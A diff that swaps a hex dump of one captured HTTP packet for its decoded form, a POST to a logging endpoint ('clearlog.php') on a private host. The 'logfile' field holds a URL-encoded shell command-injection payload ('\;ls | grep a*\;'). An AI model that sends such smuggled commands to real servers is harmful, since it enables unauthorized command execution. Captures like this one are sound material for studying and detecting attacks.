@@ -1,24 +1,20 @@
-0000   00 04 00 01 00 06 08 00 27 ba 34 53 77 64 08 00   ........'.4Swd..
-0010   45 00 01 5b 71 51 40 00 40 06 b1 47 0a 01 02 02   E..[qQ@.@..G....
-0020   0a 01 01 01 89 50 00 50 d5 6f 37 5c e1 e7 c0 c6   .....P.P.o7\....
-0030   80 18 01 f6 4e c6 00 00 01 01 08 0a aa 21 86 60   ....N........!.`
-0040   01 15 ef ef 50 4f 53 54 20 2f 61 6a 61 78 2f 6c   ....POST /ajax/l
-0050   6f 67 67 69 6e 67 2f 63 6c 65 61 72 6c 6f 67 2e   ogging/clearlog.
-0060   70 68 70 20 48 54 54 50 2f 31 2e 31 0d 0a 48 6f   php HTTP/1.1..Ho
-0070   73 74 3a 20 31 30 2e 31 2e 31 2e 31 0d 0a 43 6f   st: 10.1.1.1..Co
-0080   6e 6e 65 63 74 69 6f 6e 3a 20 6b 65 65 70 2d 61   nnection: keep-a
-0090   6c 69 76 65 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79   live..Content-Ty
-00a0   70 65 3a 20 61 70 70 6c 69 63 61 74 69 6f 6e 2f   pe: application/
-00b0   78 2d 77 77 77 2d 66 6f 72 6d 2d 75 72 6c 65 6e   x-www-form-urlen
-00c0   63 6f 64 65 64 0d 0a 41 63 63 65 70 74 3a 20 2a   coded..Accept: *
-00d0   2f 2a 0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67   /*..Content-Leng
-00e0   74 68 3a 20 35 30 0d 0a 55 73 65 72 2d 41 67 65   th: 50..User-Age
-00f0   6e 74 3a 20 70 79 74 68 6f 6e 2d 72 65 71 75 65   nt: python-reque
-0100   73 74 73 2f 32 2e 39 2e 31 0d 0a 41 63 63 65 70   sts/2.9.1..Accep
-0110   74 2d 45 6e 63 6f 64 69 6e 67 3a 20 67 7a 69 70   t-Encoding: gzip
-0120   2c 20 64 65 66 6c 61 74 65 0d 0a 0d 0a 69 64 6b   , deflate....idk
-0130   3d 66 75 63 63 6b 26 66 75 63 6b 3d 73 68 69 74   =fucck&fuck=shit
-0140   26 6c 6f 67 66 69 6c 65 3d 25 35 43 25 33 42 6c   &logfile=%5C%3Bl
-0150   73 2b 25 35 43 25 37 43 2b 67 72 65 70 2b 61 25   s+%5C%7C+grep+a%
-0160   35 43 25 32 41 25 35 43 25 33 42                  5C%2A%5C%3B
+Æ
+ª!`ïïPOST /ajax/logging/clearlog.php HTTP/1.1
 
+Host: 10.1.1.1
+
+Connection: keep-alive
+
+Content-Type: application/x-www-form-urlencoded
+
+Accept: */*
+
+Content-Length: 50
+
+User-Agent: python-requests/2.9.1
+
+Accept-Encoding: gzip, deflate
+
+
+
+idk=fucck&fuck=shit&logfile=%5C%3Bls+%5C%7C+grep+a%5C%2A%5C%3B
